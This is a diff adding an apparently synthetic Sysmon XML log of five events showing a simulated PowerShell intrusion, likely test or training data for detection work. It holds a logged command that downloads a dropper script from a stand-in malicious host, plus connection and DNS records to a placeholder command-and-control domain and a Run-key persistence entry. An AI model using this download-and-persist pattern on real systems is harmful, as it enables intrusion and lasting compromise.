@@ -1,0 +1,154 @@
+<Events>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-11-05T03:00:15.112233Z" />
+      <EventRecordID>50001</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SOC-ENDPOINT.corp.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
+      <Data Name="UtcTime">2026-11-05 03:00:15.112</Data>
+      <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-1234-567890ABCDEF}</Data>
+      <Data Name="ProcessId">4128</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="FileVersion">10.0.22621.1</Data>
+      <Data Name="Description">Windows PowerShell</Data>
+      <Data Name="Product">Microsoft Windows Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malicious.site/dropper.ps1"</Data>
+      <Data Name="CurrentDirectory">C:\Users\analyst_jane\Downloads\</Data>
+      <Data Name="User">CORP\analyst_jane</Data>
+      <Data Name="LogonGuid">{12345678-ABCD-EF01-2345-6789ABCDEF01}</Data>
+      <Data Name="LogonId">0x3e7</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA256=A1B2C3D4E5F678901234567890ABCDEF1234567890ABCDEF1234567890ABCDEF,MD5=0123456789ABCDEF0123456789ABCDEF</Data>
+      <Data Name="ParentProcessGuid">{B2C3D4E5-F6A7-8901-2345-67890ABCDEF1}</Data>
+      <Data Name="ParentProcessId">2048</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">cmd.exe /c run.bat</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>3</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>3</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-11-05T03:00:16.223344Z" />
+      <EventRecordID>50002</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SOC-ENDPOINT.corp.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-11-05 03:00:16.223</Data>
+      <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-1234-567890ABCDEF}</Data>
+      <Data Name="ProcessId">4128</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="User">CORP\analyst_jane</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="SourceIsIpv6">false</Data>
+      <Data Name="SourceIp">192.168.1.105</Data>
+      <Data Name="SourceHostname">SOC-ENDPOINT</Data>
+      <Data Name="SourcePort">55432</Data>
+      <Data Name="SourcePortName">-</Data>
+      <Data Name="DestinationIsIpv6">false</Data>
+      <Data Name="DestinationIp">198.51.100.45</Data>
+      <Data Name="DestinationHostname">c2.attacker-infrastructure.com</Data>
+      <Data Name="DestinationPort">443</Data>
+      <Data Name="DestinationPortName">https</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>11</EventID>
+      <Version>2</Version>
+      <Level>4</Level>
+      <Task>11</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-11-05T03:00:18.334455Z" />
+      <EventRecordID>50003</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SOC-ENDPOINT.corp.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1059,technique_name=Command and Scripting Interpreter</Data>
+      <Data Name="UtcTime">2026-11-05 03:00:18.334</Data>
+      <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-1234-567890ABCDEF}</Data>
+      <Data Name="ProcessId">4128</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TargetFilename">C:\Users\analyst_jane\AppData\Local\Temp\dropper.ps1</Data>
+      <Data Name="CreationUtcTime">2026-11-05 03:00:18.330</Data>
+      <Data Name="User">CORP\analyst_jane</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>12</EventID>
+      <Version>2</Version>
+      <Level>4</Level>
+      <Task>12</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-11-05T03:00:20.445566Z" />
+      <EventRecordID>50004</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SOC-ENDPOINT.corp.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1547.001,technique_name=Registry Run Keys</Data>
+      <Data Name="EventType">CreateKey</Data>
+      <Data Name="UtcTime">2026-11-05 03:00:20.445</Data>
+      <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-1234-567890ABCDEF}</Data>
+      <Data Name="ProcessId">4128</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdaterService</Data>
+      <Data Name="Details">C:\Users\analyst_jane\AppData\Local\Temp\dropper.ps1</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>22</EventID>
+      <Version>3</Version>
+      <Level>4</Level>
+      <Task>22</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-11-05T03:00:22.556677Z" />
+      <EventRecordID>50005</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SOC-ENDPOINT.corp.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="RuleName">DNS Query</Data>
+      <Data Name="UtcTime">2026-11-05 03:00:22.556</Data>
+      <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-1234-567890ABCDEF}</Data>
+      <Data Name="ProcessId">4128</Data>
+      <Data Name="QueryName">c2.attacker-infrastructure.com</Data>
+      <Data Name="QueryStatus">0</Data>
+      <Data Name="QueryResults">198.51.100.45;</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="User">CORP\analyst_jane</Data>
+    </EventData>
+  </Event>
+</Events>
